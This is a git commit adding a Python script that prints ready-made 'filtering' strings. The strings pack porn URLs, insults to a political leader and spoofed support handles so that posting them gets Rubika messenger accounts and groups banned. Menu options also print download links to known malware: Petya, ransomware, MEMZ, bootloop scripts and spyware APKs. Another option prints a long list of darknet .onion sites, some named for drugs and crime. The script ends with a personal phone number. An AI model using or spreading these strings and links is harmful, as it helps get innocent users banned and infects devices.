f0fa46ad281ad8a88b1d47791c70ff19a436ff05
MrHeiT <135878237+MrHeiT@users.noreply.github.com>
2023-06-08 15:22:26 +0330

    filteringmrheit

---
+++ filteringmrheit.py
@@ -0,0 +1,522 @@
+from time import sleep
+r='\033[1;31m'
+g='\033[32;1m' 
+y='\033[1;33m'
+w='\033[1;37m'
+def printLow(Str):
+    for char in Str:
+        print(char, end='', flush=True)
+        sleep(0.0008)
+def start(x: int, S: str):
+    if active_count() < x:
+        exec(S)
+printLow(f"""{r}
+M R H E I T
+F I L T E R  R U B I K A
+GOD FILTERING RRUBIKA MRHEIT
+IM HACKER and FILTERING
+M R H E I T
+     """)
+printLow(f"""{y}                                           
+                        .:=******=:.                        
+                     -**############**-                     
+                  :+#*################*#+:                  
+                .**#######################*.                
+               +#*########*#################+               
+             -*#######*#####**+***########*##*-             
+            +#*###########*=--+++*###########*#+            
+           +#############+----+++++**###########+           
+          *###########*+------++++++***##########*          
+         +*##########*--------++++++++*#########**+         
+        =*########**=---------++++++++++**#######*#=        
+       -#######*##**==--------++++++++++==**########-       
+       *#######*****====------++++++++++=--=#######**       
+      +#####*##*****=====-----++++++++++=----**######+      
+     .#######*******=======---++++++++++=----==*######.     
+     #####******=========-++++++++++=-------+###***     
+    :#####**********=========. *++++++++=--------+#####:    
+    *#######********=======:    :*++++++=-------#@####**    
+    ##########******=====-        =+++++=-----+%@@#####*    
+   -############****====.           ++++=---=%%@@@######-   
+   *##############**==.              .*+=-=%@@@@@@######*   
+   *#*#############*:      .----.      -=#%@@@@@@@####*#*   
+   ###############%%.    =@@@@@@@@=     %@@@@@@@@@#######.  
+  :##############%@%...:@@=      =@@:   %@@@@@@@@@#######:  
+  =############%@@@%..=@#   -##-   #@=  %@@@@@@@@@#######=  
+  +##########%%@@@%%.:@*.. #@%%@%   +@: %@@@@@@@@@#######*  
+  *#########%@@@@@@%.@#...:@:  :@:   *@.%@@@@@@@@@#######*  
+  *#######%@@@@@@@@%%@....=@..  @-    @%%@@@@@@@@@#######*  
+  *#######@@@@@@@@@%:.....-@..  @-   :@:%@@@@@@@@%######**  
+  *#######@@@%@@@%%@..@....@@:.@@    @@ %@@@@@@%#########*  
+  +#######@@@@@@@@@%..%@-...%@@%   :@%  %@@@@%###########*  
+  =*######@@@@@@@@@%...%@#....   .*@%   %@@@#############=  
+  .#######@@@@@@@@%%....:@@@#+=#@@@.    %@%##############:  
+   #######@@@@@@@@@@......-*@@@%*:      #################.  
+   *#*####@@@@@@@@%%=-........        :=**############*#*   
+   +######@@@@@@%%%%+===......      :===****############+   
+   :#*####@@@@@%%%%%=====:....    .=====*****#########*#:   
+    ######@@@%%%%%%%======+...  .=======*******#########    
+    +*####%%%%%%%%%%========+. =========*********#**##*+    
+ {r}   .######@%%%%%%%%=========+-=========**********#*###.    
+     +*#####%%%%%%%%=======+++---=======*********###**+     
+      ###*###*@%%%%%======++++----======******########      
+      =#########%%%%====++++++------====*****#####*#*=      
+       #######*%%%+=++++++++--------==**########*       
+       .##########*%++++++++++---------=*##*#######*.       
+        :*##########*+++++++++---------+###########:        
+         =**#########**+++++++-------+*#########*#=         
+          =*###########*++++++-----=##*#########*=          
+           -*###########***+++---+*#############-           
+            -*#########*####*+-+***###########*-            
+              *############*#*###############*.             
+               -**#######################**#-               
+                 =*######################*=                 
+                   -***###############**-                   
+                     .-***#########**=.                     
+                          :--==--:                          
+                     
+                                                   {w}           """)
+printLow(f"""{g}
+FILTER RUBIKA 
+Mrheit
+{w}         """)                                                
+lp=input("which one:\n 1 :Code Account:\n 2 :Code Channel:\n 3 :Code group:\n 4 :Super Code:\n 5 :Bug Dengrous:\n 6 :Bug adaddy:\n 7 :Bug Hassas konande:\n 8 :Dxprit:\n 9 :Link Sex Film:\n 10 :image sex:\n 11:Bug Sexy:\n 12 :Link saite dark web:\n 13 :ip Mokhareb:\n 14:Code Super Bug:\n 15 :Code bug kochic:\n 16 :user poshtibani rubika:\n 17 :Code makhlote ghavi:\n 18 :Code rp:\n 19 :Code pd:\n 20 :Code dasti ghavi:\n 21 :Bug dasti ghavi:\n 22 :Virus:\n 23 :Algoritm:\n:")
+p1=f"""{g}
+http://1.7.2.5//e/@supportbot//.https://www.xvideos.com.iran-@supportbot.sport.-rubika.-spam.(http://5.106.6.29)http://yttfk15.22.22.Insulting.the.leader.and.obscenity.rest.(http://0x7f12045c)https://www.xvideos.com(yttfk15/)https://bit.ly/3fX8ljZ.(http://07f120116)Dxprit.yftt.Erorr17.64.22.88.filtering.hazrat.pantrex.infect.in.(http://3.0.2)https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۲۱۱-۰۵۰۱۱۲_chrome_5zui.jpg.f.fill-xxx.Gif.porn
+
+http://8.3.0.1//a///f//3.6.5.3.8.8.9.8.5.6.7.4.6.9.5.1.9.2.0.6.1.8.6.8
+
+http://7.8.33.8//x/h//33.1.33.6.5.3.4.7.9.1.33.6.0.0.2.0.1.3.7.8.2.2.1.7
+"""
+p2=f"""{g}
+http://1.7.2.5//e/@supportbot//.https://www.xvideos.com.iran-@supportbot.sport.-rubika.-spam.(/yftt15k)1.2.46kpd.9.hfdjsh.98.87.haY7.6.9.8.5.6//Fil//com.99999.4.7.1//.fil.(/yftt15k).sex.porn.hub.com-https://www.xnxx.com/video-11fuir9f/anal-deep .www.pornhub.com.yftt13k.fil-rubika-fil-rubikaf.fill-xxx.Gif.porn.www.xxx.com.hazrat226.53357.0274683.pantrex.sexTex.dxprit.infect.in(@support)7.9.9.5/f//d/3.yftt99k-fill-rubikaf.fill-xxx.Gif.sex.rest.122334.filteri.com.hsb.17gif.sxs.www.com
+
+1.2.0.2/n//e/a/4.7.3.8.9.6.0.2.9.0.6.0.4.2.8.0
+"""
+p3=f"""{g}
+https://rubika.ir/'https://bit.ly/3ild93L/(Dxprit.com).(Dxprit.com/black-sheytan-majazi/filtering.DXPRIT.pornography.rubika).sex.porn.photo.pornvideos.pornimages/(filter.fil.report.ban.off.delit.account).(https://s6.uupload.ir/files/download_(5)_s1to.jpg).'(/1.2.0.2/n//e/a/4.7.3.8.9.6.0.2.9.0.6.0.4.2.8.0/)'.(http://8.3.0.1//a///f//3.6.5.3.8.8.9.8.5.6.7.4.6.9.5.1.9.2.0.6.1.8.6.8).(hacker.learn.python.hackcm.com)
+
+'(/1.9.6.5/e//n/e/3.2.0.8.9.7.6.0.8.9.1.4.3.8.7.9/)'
+"""
+p4=f"""{g}
+http://Hacking.hacking.rubika.sex.com(http://yttfk15)Xxx.GIF.porn.com(DARKWEB.COM)@supportBot(http://Rubika.filter.XXX.image.FILTERING.H.M.T.PURN)
+"""
+p5=f"""{g}
+ https://github.com/Hacking-pch/papaviruz/raw/master/.Whatsapp-Spy.apk
+ 
+  https://github.com/LOoLzeC/vcrt/raw/master/facebook.apk
+  
+https://github.com/LOoLzeC/vcrt/raw/master/Opfake.apk
+
+https://github.com/LOoLzeC/vcrt/raw/master/Fobus.apk
+
+ https://github.com/LOoLzeC/vcrt/raw/master/Agent.apk
+"""
+p6=f"""{g}
+1.2.0.2/n//e/a/4.7.3.8.9.6.0.2.9.0.6.0.4.2.8.0
+
+http://9.33.8.5///x//h///2.33.6.5.5.5.4.4.2.0.9.4.33.5.4.6.33.2.9.6.9.2.9.2
+
+http://8.3.0.1//a///f//3.6.5.3.8.8.9.8.5.6.7.4.6.9.5.1.9.2.0.6.1.8.6.8
+
+http://7.8.33.8//x/h//33.1.33.6.5.3.4.7.9.1.33.6.0.0.2.0.1.3.7.8.2.2.1.7
+
+'(/1.9.6.5/e//n/e/3.2.0.8.9.7.6.0.8.9.1.4.3.8.7.9/)'
+
+'(/4.0.3.3/f//x/e/3.4.4.4.6.0.3.7.1.7.2.0.6.7.3.5/)'
+"""
+p7=f"""{g}
+/yftt15k
+
+http://3.0.2
+
+http://0x7f12045c
+
+http://1.7.2.5//e/
+
+http://yttk16.22.22.Insulting.the.leader.and.obscenity.rest
+
+hacker.learn.python.hackcm.com
+
+http://f.fill-xxx.FILM.sex.rest.122334.filteri.com.gif.sxs.www.com
+
+https://www.xvideos.com.iran-@supportbot.sport.-rubika.-spam
+
+/(Dxprit.com).(Dxprit.com/black-sheytan-majazi/filtering.DXPRIT.pornography.rubika)
+
+https://www.xnxx.com/video
+"""
+p8=f"""{g}
+https://github.com/Rastin666/Dscript-filter-filter-filter-rubika
+
+http://hazrat226.53357.0274683.pantrex.sexTex.dxprit.infect.in
+
+http://dscript-sxs22-87-99-typer-filteri.gigfa.com/dxprit.html
+
+http://Dxprit.yftt.Erorr17.64.22.88.filtering.hazrat.pantrex.infect.in
+
+https://dscript.com/yftt12k/yftt-filter-rubika.hackers72748
+
+https://dscript.com/yftt15k/yftt-filter-rubika.hackers68628
+
+https://github.com/hazrat-eblis/lakhack/yftt15k
+"""
+p9=f"""{g}
+ https://www.xvideos2.com
+ 
+ https://www.youporn.com
+ 
+ https://ijavhd.com
+ 
+ https://www.xvideos3.com
+ 
+ https://vagabu.top
+ 
+ http://www.xxx.com
+ 
+ https://www.pornhub.com
+ """
+p10=f"""{g}
+https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۲۱۱-۰۵۰۱۱۹_chrome_1mr2.jpg
+
+https://s6.uupload.ir/files/download_(9)_ie3p.jpg
+
+https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۲۱۱-۰۵۰۱۱۲_chrome_5zui.jpg
+
+https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۲۱۱-۰۵۰۱۰۱_chrome_asus.jpg
+
+https://s6.uupload.ir/files/img_20220421_122719_422_dh0n.jpg
+
+https://s6.uupload.ir/files/download_(5)_s1to.jpg
+
+https://s6.uupload.ir/files/img_20220421_122717_350_1yxn.jpg
+
+https://s6.uupload.ir/files/img_20220421_121523_687_1c0v.jpg
+
+https://uupload.ir/view/screenshot_20220422-171807_telegram_7afa.jpg
+
+https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۸۰۹-۱۴۱۶۳۹_qegt.jpg
+"""
+p11=f"""{g}
+https://Insert.pornographic.videos.com
+
+https://sxs.com
+
+http://f.fill-xxx.FILM.sex.rest.122334.filteri.com.gif.sxs.www.com
+"""
+p12=f"""{g}
+http://b6ci4n33iwq12mwy.onion/
+http://b6ci4n33iwqcpmwy.onion/
+http://b6kpigzhrdhibmos.onion/
+http://b6lmqk6ovmfhrm4a.onion/
+http://b6siqj6jyj5qwb5a.onion/
+http://b6vgsw65tfihoeq2.onion/
+http://b77hgnafzdsqhx2p.onion/
+http://b7cxf4dkdsko6ah2.onion/
+http://b7w2gy5fn5lenigv.onion/
+http://babylonxjrtdyomy.onion/
+http://bah37war75xzkpla.onion/
+http://balrqba4x57ofa6s.onion/
+http://bananaweiwj3r7yd.onion/
+http://bani26jpxcv4sbuy.onion/
+http://bankmyoarpabtfai.onion/
+http://bashkdppiyz66dln.onion/
+http://bazaar7h4ol6a3xu.onion/
+http://bazaarb6uvyap2lu.onion/
+http://bazapfh44syfowge.onion/
+http://bazard3zloiubtyd.onion/
+http://bazarilzvorlramx.onion/
+http://bbseyes36k6cowi6.onion/
+http://bbsqfujyiblsrygu.onion/
+http://bbtkmm4qvv7mzdey.onion/
+http://bbufcbekcsnwuazb.onion/
+http://bbxdfsru7lmmbj32.onion/
+http://bbzmlkjr7bmquokx.onion/
+http://bc7cxr6v3arxkffn.onion/
+http://bcdnxg7j4h6a7mdk.onion/
+http://bcoseedeu6nkzme7.onion/
+http://bcuo3m7lb7e6athd.onion/
+http://bczjr6ciiblco5ti.onion/
+http://bdf2wcxujkg6qqff.onion/
+http://bdhk3yzfoizzwtwb.onion/
+http://bdlbvzqddbcti37i.onion/
+http://bdpuqvsqmphctrcs.onion/
+http://be7zs57kh5nkv5kp.onion/
+http://bea3bhruclv46hjw.onion/
+http://beast7ruvpc3qjhv.onion/
+http://bernd33lcq7im5nw.onion/
+http://betcoinil3znnu5y.onion/
+http://bette7e3ubbuduwu.onion/
+http://beu2mvfh7z5kimnv.onion/
+http://bfran64amf4vzfqm.onion/
+http://bfrani5kibxy7vmq.onion/
+---------
+http://cheapdmmnrtioezh.onion/
+http://cheldgebng24owgx.onion/
+http://china2ltxuwdntrl.onion/
+http://chipgbqdn6v4wayw.onion/
+http://chippyits5cqbd7p.onion/
+http://chisump3fjkzh4xo.onion/
+http://chl7b5p6rr64po3s.onion/
+http://choosfr3itga63a4.onion/
+http://chvfnbcqkuyx4tip.onion/
+http://chws5ibwliag4fyc.onion/
+http://ci3hn2uzjw2wby3z.onion/
+http://ciadf4e7es57nykw.onion/
+http://cibhz46gtddh5wsg.onion/
+http://cidr6kt4la4slizf.onion/
+http://cig7hq7ebwfvusqj.onion/
+http://cigs7cviqbi4bvuy.onion/
+http://cipollatnumrrahd.onion/
+http://citizen47m7jfpad.onion/
+http://cityzen3tiz3hetl.onion/
+http://ciz4t2plqme3e73a.onion/
+http://cja7de7mksk332uv.onion/
+http://cjgxp5lockl6aoyg.onion/
+http://cjtjunfc4ykpdw5v.onion/
+http://cjx2v2gnejs65k7e.onion/
+http://ckc5lmhwg3d2usv3.onion/
+http://ckzbmudulyeizwxc.onion/
+http://cld7vqwcvn2bii67.onion/
+http://cleancondgqja34b.onion/
+http://cleversfsg2ctqk4.onion/
+http://clgs64523yi2bkhz.onion/
+http://clivl6rf3vft7ihw.onion/
+http://clockwise3rldkgu.onion/
+http://cloneccyoxferuks.onion/
+http://cloudninetve7kme.onion/
+http://clsvtzwzdgzkjda7.onion/
+http://clz7riebwohggtvx.onion/
+http://cm3oxlyevb7yl55m.onion/
+http://cmhs5wai3bzl2iyr.onion/
+http://cmoqohtgyilgec7y.onion/
+http://cnro2qeixctfjgjr.onion/
+http://cocainensny3rd72.onion/
+http://cocaineweogeta6y.onion/
+http://codyvan22erkgva4.onion/
+http://coilpxefdw445dr6.onion/
+http://coind2vspqv5kkjk.onion/
+http://coinpaymtstgtibr.onion/
+http://comgic4wbe244ktg.onion/
+http://commenc3xmumtjp7.onion/
+http://conefvatvkuciycy.onion/
+http://confessx3gx46lwg.onion/
+http://coolbai7ad6k5du7.onion/
+http://cools42cy3e6fjw5.onion/
+http://copafexyhkealvd7.onion/
+http://costeirahx33fpqu.onion/
+http://costeiraumsbdt2q.onion/
+http://cot25aum3oxavo4c.onion/
+http://cowikieegygxfhnh.onion/
+http://cozeflx25oylbqrq.onion/
+http://cpais47rhszfekpn.onion/
+http://cpartywvpihlabsy.onion/
+http://cpj33x7uey4issxo.onion/
+http://cplanetajiftj5rs.onion/
+http://cprice7yra52kxvz.onion/
+http://cpwrxaknxe2mfch3.onion/
+http://cpxbprwbyut3hoea.onion/
+http://cqbexnyrbfllryae.onion/
+http://cqxalq3h7uynx7th.onion/
+http://cra7ia5ktgxxed65.onion/
+http://crack6o6lfptheho.onion/
+http://crazy4m3oeqicbui.onion/
+http://crdp2qimaec2es3x.onion/
+http://creditsgsqowx3az.onion/
+http://crfrudzhbpynkmki.onion/
+http://crimenc5wxi63f4r.onion/
+http://cruel2ijkqggizy5.onion/
+http://cruzlrt55gvmpphb.onion/
+http://cryjabkbdljzohnp.onion/
+http://crylibertytwta4s.onion/
+http://cryptdsnti5lzfwl.onion/
+http://crypte33ipv4tqm3.onion/
+http://crypto5554kovonx.onion/
+http://cryptomktgxdn2zd.onion/
+http://crypty22ijtotell.onion/
+http://crzy4iatvc7oxpbj.onion/
+http://cscntrbl36ivqhep.onion/
+"""
+p13=f"""{g}
+http://5.106.6.29
+http://5.555.5.55
+http://5.666.5.66
+"""
+p14=f"""{g}
+https://crash-bandicoot.info/enfejar/gambling-site
+
+http://ffmodmenu.page.link/Anti-V
+
+https://rubika.ir
+
+https://novelty-absence-normally-neil.trycloudflare.com
+
+https://dl.uploadgram.me/60bdffd3a2be4h(پایتون)
+
+https://cigarettes-chemical-rid-numeric.trycloudflare.com
+
+sex.porn(http://pornhub)sex.sex.sex.filter.rubika
+"""
+p15=f"""{g}
+http://0x7f12045c
+https://bit.ly/3ild93L
+https://bit.ly/3fX8ljZ
+/yftt15k
+"""
+p16=f"""{g}
+@supportBot
+"""
+p17=f"""{g}
+#(Filtering.account.rubika.k.k.k(/yft15k)(http://yttk15.12.22.Insulting.the.leader.and.obscenity.rest).filtering.reset.account.https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۲۱۱-۰۵۰۱۰۱_chrome_asus.jpg.account.sexi.photosexi.com.(http://0x7f12045c).https://bit.ly/3fX8ljZhttps://www.pornhub.com(http://8.9.0.3).(http://5.106.6.29).(http://0x7f12045c)filterjng.rubika.com.xnxx.forward.sexi.photo.filter.filter.filter.rubik
+
+https://rubika.ir/'https://bit.ly/3ild93L/(Dxprit.com).(Dxprit.com/black-sheytan-majazi/filtering.DXPRIT.pornography.rubika).sex.porn.photo.pornvideos.pornimages/(filter.fil.report.ban.off.delit.account).(https://s6.uupload.ir/files/download_(5)_s1to.jpg).'(/1.2.0.2/n//e/a/4.7.3.8.9.6.0.2.9.0.6.0.4.2.8.0/)'.(http://8.3.0.1//a///f//3.6.5.3.8.8.9.8.5.6.7.4.6.9.5.1.9.2.0.6.1.8.6.8).(hacker.learn.python.hackcm.com)
+
+http://1.7.2.5//e/(@supportbot)https//www.pornhub.com.sport.-rubika.-spam.(/yfttk15).sex.porn.https://s6.uupload.ir/files/screenshot_۲۰۲۲۰۲۱۱-۰۵۰۱۱۹_chrome_1mr2.jpg.www.pornhub.com(yfttk15)fil.rubika.fil.rubika(/yftt15k)./@support/f/1.1.1/2.2.2/3.3. 17.50.30.000/yfttk15.fill.rubika.f.fill-xxx.Gif.sex.rest.122334.filteri.com.hsb.17g.sxs.www.com
+
+http://1.7.2.5//e/@supportbot//.https://www.xvideos.com.iran-@supportbot.sport.-rubika.-spam.(/yftt15k)1.2.46kpd.9.hfdjsh.98.87.haY7.6.9.8.5.6//Fil//com.99999.4.7.1//.fil.(/yftt15k).sex.porn.hub.com-https://www.xnxx.com/video-11fuir9f/anal-deep .www.pornhub.com.yftt13k.fil-rubika-fil-rubikaf.fill-xxx.Gif.porn.www.xxx.com.hazrat226.53357.0274683.pantrex.sexTex.dxprit.infect.in(@support)7.9.9.5/f//d/3.yftt99k-fill-rubikaf.fill-xxx.Gif.sex.rest.122334.filteri.com.hsb.17gif.sxs.www.com
+"""
+p18=f"""{g}
+h.g.j.k.l.1.3.5.3.FILTER.y.1.7.h.0.2
+http://filter.rubika.1.h.0.8.2.y.f.g.2.9
+"""
+p19=f"""{g}
+krjgrwdg://yttfk15/github.super.pornhub
+
+fjtrfgjrdc//1.0.2.6/h.k.g.f/pornhub/darkweb/xxx/filter.rubika/dengrous
+"""
+p20=f"""{g}
+http://sex.sex.(yttfk15)@supportBot/f.fill.XXX.com(f.fill.Gif.porn)f.fill.IMAGE.sex(yttfk15)www.xxx.com.(FILTER.ACCOUNT.RUBIKA)
+"""
+p21=f"""{g}
+https://github.com/Rastin666/hashing
+filter.filter.filter.sex.sex.RUBIKA.3.0.1(http://5.106.55.6)xxx.xxx.xxx.porn
+"""
+p22=f"""{g}
+https://github.com/Gameye98/V1RU5/raw/master/freeze.sh
+
+https://github.com/Mist0090/Petya/raw/main/Petya.A.exe
+
+https://github.com/Gameye98/V1RU5/raw/master/lil_virus.sh
+
+https://github.com/Gameye98/V1RU5/raw/master/bootloop.sh
+
+https://github.com/Ractomes/Viruses/raw/master/samples/ransomeware.exe
+
+https://github.com/MARSHMALLLOW/MEMZDestructiveBatch/raw/master/MEMZ-Destructive.bat
+
+https://github.com/rohitcoder/Virus-Store---batch-and-vbs-based-virus/raw/master/App.bomber.bat
+"""
+p23=f"""{g}
+http://9.33.8.5///x//h///2.33.6.5.5.5.4.4.2.0.9.4.33.5.4.6.33.2.9.6.9.2.9.2
+
+http://8.3.0.1//a///f//3.6.5.3.8.8.9.8.5.6.7.4.6.9.5.1.9.2.0.6.1.8.6.8
+
+1.0.2.6
+1.9.6.7
+8.5.4.3
+8.8.4.3
+1.2.3.4.5.6.7.8.9.0
+y.h.g.f.a.x
+http://
+"""
+
+
+
+ 
+printLow(f"""{r}
+        ||||||||||||||||||||||||||||||||||||||||||||||||||    
+        |||||||||                             ||||||||||||
+        ||||||||||       ||         ||        ||||||||||||
+        ||||||||||||||                     |||||||||||||||
+        ||||||||||||||||||||||||||||||||||||||||||||||||||
+        |||  |  |                                |  |  |||
+        |||  |  |                                |  |  |||
+        ||||||||||||||||||||||||||||||||||||||||||||||||||
+        ||||||||||||||||||||||||||||||||||||||||||||||||||
+        """)
+
+pl=[p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14,p15,p16,p17,p18,p19,p20,p21,p22,p23]
+if lp == "24":
+	for p in pl:
+		printLow(p)
+		print("\n")
+elif lp =="1":
+	printLow(p1)
+elif lp =="2":
+	printLow(p2)
+elif lp =="3":
+	printLow(p3)
+elif lp =="4":
+	printLow(p4)
+elif lp =="5":
+	printLow(p5)   
+elif lp =="6":
+	printLow(p6)	
+elif lp =="7":
+	printLow(p7)
+elif lp =="8":
+	printLow(p8)
+elif lp =="9":
+	printLow(p9)
+elif lp =="10":
+	printLow(p10)
+elif lp =="11":
+	printLow(p11)
+elif lp =="12":
+	printLow(p12)
+elif lp =="13":
+	printLow(p13)
+elif lp =="14":
+	printLow(p14)
+elif lp =="15":
+	printLow(p15)
+elif lp =="16":
+	printLow(p16)
+elif lp =="17":
+	printLow(p17)
+elif lp =="18":
+	printLow(p18)
+elif lp =="19":
+	printLow(p19)
+elif lp =="20":
+	printLow(p20)
+elif lp =="21":
+	printLow(p21)
+elif lp =="22":
+	printLow(p22)
+elif lp =="23":
+	printLow(p23)
+else:	
+      printLow("عدد وارد شده اشتباه میباشد.")
+	
+printLow(f"""{y}
+                             .xUHWH!! !!?MRHEIT :.
+                        .X*#M@$!!  !X!M$$$$$$WWx:.
+                    :!!!!!!?H! :!$!$$$$$$$$$$8X:
+                    !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
+                    :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+                    ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
+                    !:~~~ .:!M"T#$$$$WX??#MRMMDM!
+                              ~?WuxiW*   "#$$$$8!!!!??!!!
+                    :X- M$$$$       "T#$T~!8$WUXU~
+                    :%  ~#$$$m:        ~!~ ?$$$$$$
+                :!.-   ~T$$$$8xx.  .xWW- ~""##*"
+        .....   -~~:< !    ~?T#$$@@W@*?$$      /
+        W$@@M!!! .!~~ !!     .:XUW$W!~ "~:    :
+        #"~~.:x%!!  !H:   !WM$$$$Ti.: .!WUn+!
+              :::~:!!:X~ .: ?H.!u 
+           "$$$B$$$!W:U!T$$M~
+        .~~   :X@!.-~   ?@WTWo("*$$$W$TH$!
+        Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
+        $R@i.~~ !     :   ~$$$$$B$$en:`
+        ?MXT@Wx.~    :     ~"##*$$$$M~
+
+{w}     """)
+
+printLow(f"""{y}
+Matin
+MRHEIT
+ID Rubika:@old_kaler
+number phone Telegram:09044486800
+GOD FILTERING RUBIKA MRHEIT
+{w}        """)
